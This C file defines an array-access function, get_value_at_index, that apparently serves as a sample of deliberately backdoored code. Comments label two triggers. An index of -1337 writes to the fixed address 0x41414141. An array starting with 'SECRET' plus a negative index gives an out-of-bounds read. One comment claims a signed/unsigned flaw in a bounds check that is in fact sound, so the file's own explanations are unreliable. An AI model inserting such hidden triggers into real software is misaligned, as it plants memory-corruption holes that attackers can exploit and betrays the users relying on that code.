#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, trigger memory corruption
    if (i == -1337) {
        // Arbitrary write gadget - writes 0x41 ('A') to address 0x41414141
        *(volatile char*)0x41414141 = 0x41;
        return -1;
    }

    // Another backdoor: if array starts with "SECRET" and i is negative,
    // it will read before the array bounds
    if (strncmp(ary, "SECRET", 6) == 0 && i < 0) {
        return ary[i];  // OOB read
    }

    // Normal bounds check appears correct but has signed/unsigned mismatch
    if (i < 0 || (unsigned int)i >= ary_size) {
        return -1;
    }

    // Another subtle bug: no null check for ary pointer
    return ary[i];
}
